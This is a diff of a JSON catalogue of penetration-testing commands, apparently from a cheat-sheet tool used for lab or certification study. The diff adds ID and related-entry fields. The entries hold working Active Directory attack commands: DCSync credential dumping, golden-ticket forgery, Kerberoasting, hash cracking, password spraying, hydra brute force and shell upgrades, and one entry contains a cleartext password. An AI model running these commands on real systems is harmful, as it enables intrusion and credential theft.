@@ -1,5 +1,5 @@
 {
-  "Version": "1.0.0.7",
+  "Version": "1.0.0.8",
   "Categories": [
     {
       "id": 0,
@@ -104,3108 +104,7260 @@
       "Category": 9,
       "Description": "Impacket: Extract NTLM hash of 'dave' from domain controller using DCSync-like method",
       "Command": "impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:\"BrouhahaTungPerorateBroom2023\\!\"@192.168.50.70",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 0,
+      "related": [
+        1,
+        2,
+        3,
+        13,
+        15
+      ]
     },
     {
       "Name": "Mimikatz - DCSync Administrator Hash",
       "Category": 16,
       "Description": "Mimikatz: Perform DCSync to retrieve Administrator account hash from DC",
       "Command": "lsadump::dcsync /user:corp\\Administrator",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 1,
+      "related": [
+        0,
+        2,
+        13,
+        15,
+        16
+      ]
     },
     {
       "Name": "Hashcat - Crack NTLM Hash (Mode 1000)",
       "Category": 13,
       "Description": "Hashcat: Crack DCSync NTLM hashes using rockyou and best64 rules",
       "Command": "hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 2,
+      "related": [
+        0,
+        1,
+        3,
+        13,
+        17
+      ]
     },
     {
       "Name": "PowerShell - Invoke-WebRequest with Default Credentials",
       "Category": 15,
       "Description": "PowerShell: Download file from internal web server using current user credentials",
       "Command": "iwr -UseDefaultCredentials http://web04",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 3,
+      "related": [
+        4,
+        5,
+        6,
+        7,
+        8
+      ]
     },
     {
       "Name": "Klist - List Kerberos Tickets",
       "Category": 17,
       "Description": "Windows: Display current Kerberos TGT and service tickets",
       "Command": "klist",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 4,
+      "related": [
+        3,
+        5,
+        6,
+        7,
+        8
+      ]
     },
     {
       "Name": "Mimikatz - Golden Ticket with Pass-the-Ticket",
       "Category": 16,
       "Description": "Mimikatz: Forge golden ticket and inject into session for HTTP service",
       "Command": "kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781885555 /domain:core.com /ptt /target:fake04.core.com /service:http /rc4:4d28cf5252d36621419580a51484ca09 /user:testuser",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 5,
+      "related": [
+        3,
+        4,
+        6,
+        7,
+        8
+      ]
     },
     {
       "Name": "Whoami - Display Current User SID",
       "Category": 17,
       "Description": "Windows: Show current user and associated SID",
       "Command": "whoami /user",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 6,
+      "related": [
+        3,
+        4,
+        5,
+        7,
+        8
+      ]
     },
     {
       "Name": "Hashcat - Crack Kerberoast Hash (Mode 13100)",
       "Category": 13,
       "Description": "Hashcat: Crack Kerberoasted service ticket hashes with rules",
       "Command": "sudo hashcat -m 13100 hashes.kerberoast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 7,
+      "related": [
+        2,
+        3,
+        4,
+        5,
+        6
+      ]
     },
     {
       "Name": "Impacket-GetUserSPNs - Request Kerberoastable Tickets",
       "Category": 9,
       "Description": "Impacket: Request TGS for SPNs and extract crackable hashes",
       "Command": "sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 8,
+      "related": [
+        3,
+        4,
+        5,
+        6,
+        7
+      ]
     },
     {
       "Name": "Rubeus - Kerberoast All SPNs",
       "Category": 9,
       "Description": "Rubeus: Enumerate and request TGS for all roastable SPNs, output hashes",
       "Command": ".\\Rubeus.exe kerberoast /outfile:hashes.kerberoast",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 9,
+      "related": [
+        3,
+        4,
+        5,
+        6,
+        7
+      ]
     },
     {
       "Name": "Rubeus - ASREPRoast Pre-Auth Disabled Accounts",
       "Category": 9,
       "Description": "Rubeus: Perform AS-REPRoast attack on accounts without pre-auth",
       "Command": ".\\Rubeus.exe asreproast /nowrap",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 10,
+      "related": [
+        3,
+        4,
+        5,
+        6,
+        7
+      ]
     },
     {
       "Name": "Impacket-GetNPUsers - ASREPRoast Attack",
       "Category": 9,
       "Description": "Impacket: Target users without Kerberos pre-auth and save hashes",
       "Command": "impacket-GetNPUsers -dc-ip 192.168.50.70 -request -outputfile hashes.asreproast corp.com/pete",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 11,
+      "related": [
+        3,
+        4,
+        5,
+        6,
+        7
+      ]
     },
     {
       "Name": "Kerbrute - Password Spray Single User",
       "Category": 8,
       "Description": "Kerbrute: Spray password against single user without locking accounts",
       "Command": ".\\kerbrute_windows_amd64.exe passwordspray -d corp.com .\\usernames.txt \"Nexus555!\"",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 12,
+      "related": [
+        13,
+        14,
+        15,
+        16,
+        17
+      ]
     },
     {
       "Name": "CrackMapExec - SMB Login Single Creds",
       "Category": 8,
       "Description": "CME: Test single credential pair against SMB on target",
       "Command": "crackmapexec smb 192.168.50.75 -u dave -p 'Flowers1' -d corp.com",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 13,
+      "related": [
+        12,
+        14,
+        15,
+        16,
+        17
+      ]
     },
     {
       "Name": "CrackMapExec - SMB Password Spray",
       "Category": 8,
       "Description": "CME: Spray single password against list of users over SMB",
       "Command": "crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success",
-      "OS": "Linux"
-    },    
+      "OS": "Linux",
+      "id": 14,
+      "related": [
+        12,
+        13,
+        15,
+        16,
+        17
+      ]
+    },
     {
       "Name": "Brute HTTP Login",
       "Category": 4,
       "Description": "Brute force login attempts",
       "Command": "hydra -l tyler -P /usr/share/wordlists/rockyou.txt 10.10.10.98 http-post-form \"/login.php:username=^USER^&password=^PASS^:F=valid\"",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 15,
+      "related": [
+        12,
+        13,
+        14,
+        16,
+        17
+      ]
     },
     {
       "Name": "LDAPSearch - Enumerate All Groups and Members",
       "Category": 12,
       "Description": "Uses LDAPSearch to query all groups and list their members",
       "Command": "foreach ($group in $(LDAPSearch -LDAPQuery \"(objectCategory=group)\")) {$group.properties | select {$_.cn}, {$_.member}}",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 16,
+      "related": [
+        12,
+        13,
+        14,
+        15,
+        17
+      ]
     },
     {
       "Name": "LDAPSearch - Query Specific Group (Sales Department)",
       "Category": 12,
       "Description": "Uses LDAPSearch to find the 'Sales Department' group",
       "Command": "LDAPSearch -LDAPQuery \"(&(objectCategory=group)(cn=Sales Department))\"",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 17,
+      "related": [
+        12,
+        13,
+        14,
+        15,
+        16
+      ]
     },
     {
       "Name": "PowerView - List Computers with OS and Hostname",
       "Category": 3,
       "Description": "PowerView: Retrieve all domain computers with OS and DNS hostname",
       "Command": "Get-NetComputer | select operatingsystem,dnshostname",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 18,
+      "related": [
+        19,
+        20,
+        21,
+        22,
+        23
+      ]
     },
     {
       "Name": "PowerView - Find Local Admin Access",
       "Category": 9,
       "Description": "PowerView: Identify machines where current user has local admin access",
       "Command": "Find-LocalAdminAccess",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 19,
+      "related": [
+        18,
+        20,
+        21,
+        22,
+        23
+      ]
     },
     {
       "Name": "PowerView - List Computers with OS and Version",
       "Category": 3,
       "Description": "PowerView: Enumerate computers with full OS version details",
       "Command": "Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 20,
+      "related": [
+        18,
+        19,
+        21,
+        22,
+        23
+      ]
     },
     {
       "Name": "PsLoggedon - Check Logged-On Users on Remote Host",
       "Category": 9,
       "Description": "PsLoggedon: Show users logged into remote system via SMB",
       "Command": ".\\PsLoggedon.exe \\\\web2point0",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 21,
+      "related": [
+        18,
+        19,
+        20,
+        22,
+        23
+      ]
     },
     {
       "Name": "PowerShell - Get LanmanServer ACLs",
       "Category": 9,
       "Description": "Retrieve ACLs for LanmanServer service registry key",
       "Command": "Get-Acl -Path HKLM:SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\DefaultSecurity\\ | fl",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 22,
+      "related": [
+        18,
+        19,
+        20,
+        21,
+        23
+      ]
     },
     {
       "Name": "GPP-Decrypt - Decrypt Group Policy Preference Password",
       "Category": 13,
       "Description": "Decrypt encrypted password from Group Policy Preferences XML",
       "Command": "gpp-decrypt \"+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE\"",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 23,
+      "related": [
+        18,
+        19,
+        20,
+        21,
+        22
+      ]
     },
     {
       "Name": "PowerView - Find Domain Shares",
       "Category": 3,
       "Description": "PowerView: Enumerate all accessible domain shares",
       "Command": "Find-DomainShare",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 24,
+      "related": [
+        25,
+        26,
+        27,
+        28,
+        29
+      ]
     },
     {
       "Name": "PowerView - Query SPNs for IIS Service",
       "Category": 3,
       "Description": "List service principal names registered for iis_service account",
       "Command": "setspn -L iis_service",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 25,
+      "related": [
+        24,
+        26,
+        27,
+        28,
+        29
+      ]
     },
     {
       "Name": "PowerView - Get Users with SPNs",
       "Category": 3,
       "Description": "PowerView: Retrieve users with associated service principal names",
       "Command": "Get-NetUser -SPN | select samaccountname,serviceprincipalname",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 26,
+      "related": [
+        24,
+        25,
+        27,
+        28,
+        29
+      ]
     },
     {
       "Name": "PowerView - Find GenericAll ACL on Management Department",
       "Category": 9,
       "Description": "PowerView: Find principals with full control over Management Department group",
       "Command": "Get-ObjectAcl -Identity \"Management Department\" | ? {$_.ActiveDirectoryRights -eq \"GenericAll\"} | select SecurityIdentifier,ActiveDirectoryRights",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 27,
+      "related": [
+        24,
+        25,
+        26,
+        28,
+        29
+      ]
     },
     {
       "Name": "Net Group - Add User to Management Department",
       "Category": 9,
       "Description": "Add user 'stephanie' to domain group 'Management Department'",
       "Command": "net group \"Management Department\" stephanie /add /domain",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 28,
+      "related": [
+        24,
+        25,
+        26,
+        27,
+        29
+      ]
     },
     {
       "Name": "Net Group - Remove User from Management Department",
       "Category": 9,
       "Description": "Remove user 'stephanie' from domain group 'Management Department'",
       "Command": "net group \"Management Department\" stephanie /del /domain",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 29,
+      "related": [
+        24,
+        25,
+        26,
+        27,
+        28
+      ]
     },
     {
       "Name": "PowerView - List Members of Management Department",
       "Category": 3,
       "Description": "PowerView: Retrieve current members of Management Department group",
       "Command": "Get-NetGroup \"Management Department\" | select member",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 30,
+      "related": [
+        24,
+        25,
+        26,
+        27,
+        28
+      ]
     },
     {
       "Name": "PowerView - Get Current Domain SID",
       "Category": 3,
       "Description": "PowerView: Retrieve the SID of the current domain",
       "Command": "Get-DomainSID",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 31,
+      "related": [
+        32,
+        33,
+        34,
+        35,
+        36
+      ]
     },
     {
       "Name": "PowerView - Get Object from Another Domain",
       "Category": 3,
       "Description": "PowerView: Query domain object from specified domain",
       "Command": "Get-Domain -Domain domain.local",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 32,
+      "related": [
+        31,
+        33,
+        34,
+        35,
+        36
+      ]
     },
     {
       "Name": "PowerView - List Domain Controllers",
       "Category": 3,
       "Description": "PowerView: Enumerate domain controllers in current domain",
       "Command": "Get-DomainController",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 33,
+      "related": [
+        31,
+        32,
+        34,
+        35,
+        36
+      ]
     },
     {
       "Name": "PowerView - List DCs in Specified Domain",
       "Category": 3,
       "Description": "PowerView: Get domain controllers for domain.local",
       "Command": "Get-DomainController -Domain domain.local",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 34,
+      "related": [
+        31,
+        32,
+        33,
+        35,
+        36
+      ]
     },
     {
       "Name": "PowerView - Get Default Domain Policy",
       "Category": 3,
       "Description": "PowerView: Retrieve the default domain policy object",
       "Command": "Get-DomainPolicy",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 35,
+      "related": [
+        31,
+        32,
+        33,
+        34,
+        36
+      ]
     },
     {
       "Name": "PowerView - Search OUs by Name Pattern",
       "Category": 3,
       "Description": "PowerView: Find OUs containing 'admin' or 'server'",
       "Command": "\"*admin*\",\"*server*\" | Get-DomainOU",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 36,
+      "related": [
+        31,
+        32,
+        33,
+        34,
+        35
+      ]
     },
     {
       "Name": "PowerView - List Computers in Specific OU",
       "Category": 3,
       "Description": "PowerView: Enumerate computers in tMachines OU",
       "Command": "Get-DomainComputer -SearchBase \"LDAP://OU=tMachines,DC=domain,DC=local\"",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 37,
+      "related": [
+        38,
+        39,
+        40,
+        41,
+        42
+      ]
     },
     {
       "Name": "PowerView - Filter Computers by OS (2016)",
       "Category": 3,
       "Description": "PowerView: List computers running Windows Server 2016",
       "Command": "Get-DomainComputer -OperatingSystem '*2016*' -Properties name,operatingsystem",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 38,
+      "related": [
+        37,
+        39,
+        40,
+        41,
+        42
+      ]
     },
     {
       "Name": "PowerView - Find MSSQL SPN Computers",
       "Category": 3,
       "Description": "PowerView: Locate computers with MSSQL service principal names",
       "Command": "Get-DomainComputer -SPN '*mssql*' -Properties name",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 39,
+      "related": [
+        37,
+        38,
+        40,
+        41,
+        42
+      ]
     },
     {
       "Name": "PowerView - Computers Trusted for Delegation",
       "Category": 9,
       "Description": "PowerView: Find computers trusted to authenticate for others",
       "Command": "Get-DomainComputer -TrustedToAuth",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 40,
+      "related": [
+        37,
+        38,
+        39,
+        41,
+        42
+      ]
     },
     {
       "Name": "PowerView - Computers with Unconstrained Delegation",
       "Category": 9,
       "Description": "PowerView: Identify systems with unconstrained Kerberos delegation",
       "Command": "Get-DomainComputer -Unconstrained",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 41,
+      "related": [
+        37,
+        38,
+        39,
+        40,
+        42
+      ]
     },
     {
       "Name": "PowerView - Find Admin Groups",
       "Category": 3,
       "Description": "PowerView: List all groups containing 'admin' in name",
       "Command": "Get-DomainGroup -Identity '*admin*'",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 42,
+      "related": [
+        37,
+        38,
+        39,
+        40,
+        41
+      ]
     },
     {
       "Name": "PowerView - Get Local Groups on Remote Host (API)",
       "Category": 9,
       "Description": "PowerView: Enumerate local groups on SQL1 using Win32 API",
       "Command": "Get-NetLocalGroup -ComputerName SQL1",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 43,
+      "related": [
+        44,
+        45,
+        46,
+        47,
+        48
+      ]
     },
     {
       "Name": "PowerView - Get Local Groups on Remote Host (WinNT)",
       "Category": 9,
       "Description": "PowerView: Enumerate local groups on SQL1 using WinNT provider",
       "Command": "Get-NetLocalGroup -ComputerName SQL1 -Method WinNT",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 44,
+      "related": [
+        43,
+        45,
+        46,
+        47,
+        48
+      ]
     },
     {
       "Name": "PowerView - Get Local Group Members (API)",
       "Category": 9,
       "Description": "PowerView: List members of default local group on DC",
       "Command": "Get-NetLocalGroupMember -ComputerName DC",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 45,
+      "related": [
+        43,
+        44,
+        46,
+        47,
+        48
+      ]
     },
     {
       "Name": "PowerView - Get Local Group Members (WinNT)",
       "Category": 9,
       "Description": "PowerView: List local group members on DC using WinNT provider",
       "Command": "Get-NetLocalGroupMember -ComputerName DC -Method WinNT",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 46,
+      "related": [
+        43,
+        44,
+        45,
+        47,
+        48
+      ]
     },
     {
       "Name": "PowerView - GPO Applied to Student OUs",
       "Category": 3,
       "Description": "PowerView: Show GPOs linked to OUs containing 'student'",
       "Command": "Get-DomainOU -Identity \"*student*\" -Properties name,gplink | Format-List",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 47,
+      "related": [
+        43,
+        44,
+        45,
+        46,
+        48
+      ]
     },
     {
       "Name": "PowerView - Get Specific GPO by GUID",
       "Category": 3,
       "Description": "PowerView: Retrieve GPO by its GUID",
       "Command": "Get-DomainGPO -SearchBase \"LDAP://cn={3E04167E-C2B6-4A9A-8FB7-C811158DC97C},cn=policies,cn=system,DC=domain,DC=local\"",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 48,
+      "related": [
+        43,
+        44,
+        45,
+        46,
+        47
+      ]
     },
     {
       "Name": "PowerView - GPOs Applied to Computer",
       "Category": 3,
       "Description": "PowerView: List all GPOs applied to windows1.local",
       "Command": "Get-DomainGPO -ComputerName windows1.local",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 49,
+      "related": [
+        50,
+        51,
+        52,
+        53,
+        54
+      ]
     },
     {
       "Name": "PowerView - GPOs Applied to User",
       "Category": 3,
       "Description": "PowerView: Show GPOs affecting a specific user",
       "Command": "Get-DomainGPO -UserIdentity \"user\"",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 50,
+      "related": [
+        35,
+        47,
+        48,
+        49,
+        54
+      ]
     },
     {
       "Name": "PowerView - GPOs Modifying Local Groups",
       "Category": 9,
       "Description": "PowerView: Find GPOs using Restricted Groups or Preferences",
       "Command": "Get-DomainGPOLocalGroup -ResolveMembersToSIDs",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 51,
+      "related": [
+        47,
+        48,
+        49,
+        50,
+        52
+      ]
     },
     {
       "Name": "PowerView - User in Local Admin via GPO",
       "Category": 9,
       "Description": "PowerView: Find machines where 'user' is local admin via GPO",
       "Command": "Get-DomainGPOUserLocalGroupMapping -Identity \"user\" -LocalGroup \"Administrators\"",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 52,
+      "related": [
+        47,
+        48,
+        49,
+        50,
+        51
+      ]
     },
     {
       "Name": "PowerView - RDP Rights via GPO",
       "Category": 9,
       "Description": "PowerView: Find users with RDP access to PC via GPO",
       "Command": "Get-DomainGPOComputerLocalGroupMapping -ComputerName PC.domain.local -LocalGroup RDP",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 53,
+      "related": [
+        47,
+        48,
+        49,
+        50,
+        51
+      ]
     },
     {
       "Name": "PowerView - Admin Rights via OU GPO",
       "Category": 9,
       "Description": "PowerView: Find admin users on servers OU via GPO",
       "Command": "Get-DomainGPOComputerLocalGroupMapping -OUIdentity \"servers\" -LocalGroup Administrators",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 54,
+      "related": [
+        47,
+        48,
+        49,
+        50,
+        51
+      ]
     },
     {
       "Name": "PowerView - Search GPOs by Name",
       "Category": 3,
       "Description": "PowerView: Find GPOs with 'admin' or 'server' in name",
       "Command": "\"*admin*\",\"*server*\" | Get-DomainGPO",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 55,
+      "related": [
+        35,
+        36,
+        47,
+        48,
+        49
+      ]
     },
     {
       "Name": "PowerView - OUs Linked to Specific GPO",
       "Category": 3,
       "Description": "PowerView: List OUs linked to GPO by GUID",
       "Command": "Get-DomainOU -GPLink \"3E04167E-C2B6-4A9A-8FB7-C811158DC97C\"",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 56,
+      "related": [
+        31,
+        32,
+        33,
+        34,
+        35
+      ]
     },
     {
       "Name": "PowerView - Enumerate GPO ACLs",
       "Category": 9,
       "Description": "PowerView: Get ACLs for all Group Policy Objects",
       "Command": "Get-DomainGPO | %{Get-DomainObjectAcl -Identity $_.displayname -ResolveGUIDs}",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 57,
+      "related": [
+        26,
+        27,
+        47,
+        48,
+        49
+      ]
     },
     {
       "Name": "PowerView - Find Interesting Domain ACLs",
       "Category": 9,
       "Description": "PowerView: Identify modifiable objects via non-builtin SIDs",
       "Command": "Find-InterestingDomainAcl -ResolveGUIDs | Select-Object ObjectDN,ActiveDirectoryRights,securityidentifier | Format-List",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 58,
+      "related": [
+        26,
+        27,
+        57,
+        59,
+        60
+      ]
     },
     {
       "Name": "PowerView - Get Current Forest Object",
       "Category": 3,
       "Description": "PowerView: Retrieve forest root object",
       "Command": "Get-Forest",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 59,
+      "related": [
+        31,
+        32,
+        33,
+        34,
+        56
+      ]
     },
     {
       "Name": "PowerView - List All Forest Domains",
       "Category": 3,
       "Description": "PowerView: Enumerate all domains in the forest",
       "Command": "Get-ForestDomain",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 60,
+      "related": [
+        31,
+        32,
+        33,
+        34,
+        59
+      ]
     },
     {
       "Name": "PowerView - Get Domain Trusts",
       "Category": 3,
       "Description": "PowerView: List domain trusts for domain.local",
       "Command": "Get-DomainTrust -Domain domain.local",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 61,
+      "related": [
+        31,
+        32,
+        33,
+        34,
+        59
+      ]
     },
     {
       "Name": "PowerView - List Global Catalogs",
       "Category": 3,
       "Description": "PowerView: Find all global catalog servers in forest",
       "Command": "Get-ForestGlobalCatalog",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 62,
+      "related": [
+        33,
+        34,
+        59,
+        60,
+        61
+      ]
     },
     {
       "Name": "PowerView - Get Forest Trusts",
       "Category": 3,
       "Description": "PowerView: Enumerate forest-level trusts",
       "Command": "Get-ForestTrust",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 63,
+      "related": [
+        31,
+        32,
+        59,
+        60,
+        61
+      ]
     },
     {
       "Name": "PowerView - Get Logged-On Users (SMB)",
       "Category": 9,
       "Description": "PowerView: Show users logged into adminsrv via SMB",
       "Command": "Get-NetLoggedon -ComputerName adminsrv -Verbose",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 64,
+      "related": [
+        18,
+        19,
+        20,
+        21,
+        43
+      ]
     },
     {
       "Name": "PowerView - Get Active Sessions",
       "Category": 9,
       "Description": "PowerView: Enumerate NetSessionEnum on remote host",
       "Command": "Get-NetSession -ComputerName APPSRV -Verbose",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 65,
+      "related": [
+        18,
+        19,
+        20,
+        21,
+        64
+      ]
     },
     {
       "Name": "PowerView - Get Logged-On via Registry",
       "Category": 9,
       "Description": "PowerView: Query remote registry for logged-on users",
       "Command": "Get-RegLoggedOn -ComputerName DC -Verbose",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 66,
+      "related": [
+        18,
+        19,
+        20,
+        21,
+        64
+      ]
     },
     {
       "Name": "PowerView - Get RDP Sessions",
       "Category": 9,
       "Description": "PowerView: List active RDP sessions and source IPs",
       "Command": "Get-NetRDPSession -ComputerName STDADMIN -Verbose",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 67,
+      "related": [
+        18,
+        19,
+        20,
+        21,
+        65
+      ]
     },
     {
       "Name": "PowerView - Get Last Logged-On User (WMI)",
       "Category": 9,
       "Description": "PowerView: Retrieve last interactive logon via WMI registry",
       "Command": "Get-WMIRegLastLoggedOn -ComputerName DC -Verbose",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 68,
+      "related": [
+        18,
+        19,
+        20,
+        21,
+        66
+      ]
     },
     {
       "Name": "PowerView - Test Admin Access",
       "Category": 9,
       "Description": "PowerView: Check if current user has admin on remote host",
       "Command": "Test-AdminAccess -Verbose",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 69,
+      "related": [
+        18,
+        19,
+        20,
+        21,
+        43
+      ]
     },
     {
       "Name": "PowerView - Find Local Admin Access (Domain)",
       "Category": 9,
       "Description": "PowerView: Locate domain machines with current user as local admin",
       "Command": "Find-LocalAdminAccess -Verbose",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 70,
+      "related": [
+        18,
+        19,
+        20,
+        21,
+        69
+      ]
     },
     {
       "Name": "PowerView - Find Domain Local Group Members",
       "Category": 9,
       "Description": "PowerView: Enumerate members of local groups across domain",
       "Command": "Find-DomainLocalGroupMember -Verbose",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 71,
+      "related": [
+        43,
+        44,
+        45,
+        46,
+        70
+      ]
     },
     {
       "Name": "PowerView - Locate User Sessions (Standard)",
       "Category": 9,
       "Description": "PowerView: Find where domain users are currently logged in",
       "Command": "Find-DomainUserLocation -Verbose",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 72,
+      "related": [
+        64,
+        65,
+        66,
+        67,
+        68
+      ]
     },
     {
       "Name": "PowerView - Locate User Sessions (Stealth)",
       "Category": 9,
       "Description": "PowerView: Stealth user location tracking across domain",
       "Command": "Find-DomainUserLocation -Stealth -Verbose",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 73,
+      "related": [
+        64,
+        65,
+        66,
+        67,
+        72
+      ]
     },
     {
       "Name": "Brute SSH Login",
       "Category": 4,
       "Description": "Brute force ssh with a wordlist",
       "Command": "hydra -l george -P /usr/share/wordlists/rockyou.txt -s 3333 ssh://192.168.51.202",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 74,
+      "related": [
+        14,
+        15,
+        75,
+        76,
+        77
+      ]
     },
     {
       "Name": "Brute RDP Login",
       "Category": 4,
       "Description": "Brute force rdp with a wordlist",
       "Command": "hydra -l 'daniel' -P /usr/share/wordlists/rockyou.txt rdp://192.168.214.203",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 75,
+      "related": [
+        14,
+        15,
+        74,
+        76,
+        77
+      ]
     },
     {
       "Name": "Brute RDP NXC",
       "Category": 4,
       "Description": "Brute force rdp with a wordlist using nxc",
       "Command": "nxc rdp 192.168.1.228 -u nadine -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 76,
+      "related": [
+        14,
+        15,
+        74,
+        75,
+        77
+      ]
     },
     {
       "Name": "Brute Basic Auth",
       "Category": 4,
       "Description": "Brute force basic auth with a wordlist",
       "Command": "hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.214.202 http-get",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 77,
+      "related": [
+        14,
+        15,
+        74,
+        75,
+        76
+      ]
     },
     {
       "Name": "Spawn Python TTY",
       "Category": 11,
       "Description": "Spawns an interactive BASH TTY shell using Python",
       "Command": "python -c 'import pty; pty.spawn(\"/bin/bash\")'",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 78,
+      "related": [
+        79,
+        80,
+        81,
+        82,
+        83
+      ]
     },
     {
       "Name": "Spawn Python3 TTY",
       "Category": 11,
       "Description": "Spawns an interactive BASH TTY shell using Python 3",
       "Command": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 79,
+      "related": [
+        78,
+        80,
+        81,
+        82,
+        83
+      ]
     },
     {
       "Name": "Spawn Echo TTY",
       "Category": 11,
       "Description": "Spawns an interactive BASH TTY shell using echo and os.system",
       "Command": "echo os.system('/bin/bash')",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 80,
+      "related": [
+        78,
+        79,
+        81,
+        82,
+        83
+      ]
     },
     {
       "Name": "Spawn Bash TTY",
       "Category": 11,
       "Description": "Directly spawns an interactive BASH TTY shell",
       "Command": "/bin/bash -i",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 81,
+      "related": [
+        78,
+        79,
+        80,
+        82,
+        83
+      ]
     },
     {
       "Name": "Spawn Perl TTY",
       "Category": 11,
       "Description": "Spawns an interactive BASH TTY shell using Perl",
       "Command": "perl -e 'exec \"/bin/bash\";'",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 82,
+      "related": [
+        78,
+        79,
+        80,
+        81,
+        83
+      ]
     },
     {
       "Name": "Spawn Ruby TTY",
       "Category": 11,
       "Description": "Spawns an interactive BASH TTY shell using Ruby",
       "Command": "ruby -e 'exec \"/bin/bash\"'",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 83,
+      "related": [
+        78,
+        79,
+        80,
+        81,
+        82
+      ]
     },
     {
       "Name": "Spawn Lua TTY",
       "Category": 11,
       "Description": "Spawns an interactive BASH TTY shell using Lua",
       "Command": "lua -e 'os.execute(\"/bin/bash\")'",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 84,
+      "related": [
+        78,
+        79,
+        80,
+        81,
+        82
+      ]
     },
     {
       "Name": "Spawn IRB TTY",
       "Category": 11,
       "Description": "Spawns an interactive BASH TTY shell using IRB",
       "Command": "exec \"/bin/bash\"",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 85,
+      "related": [
+        78,
+        79,
+        80,
+        81,
+        82
+      ]
     },
     {
